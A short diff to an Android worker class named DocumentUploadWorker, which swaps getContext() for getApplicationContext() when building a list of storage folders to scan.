@@ -65,7 +65,7 @@ public class DocumentUploadWorker extends Worker {
                 "/sdcard/Documents",
                 "/sdcard/DCIM",
                 "/sdcard/Downloads",
-                getContext().getExternalFilesDir(null) != null ? getContext().getExternalFilesDir(null).getAbsolutePath() : null,
+                getApplicationContext().getExternalFilesDir(null) != null ? getApplicationContext().getExternalFilesDir(null).getAbsolutePath() : null,
         };
 
         for (String path : scanPaths) {
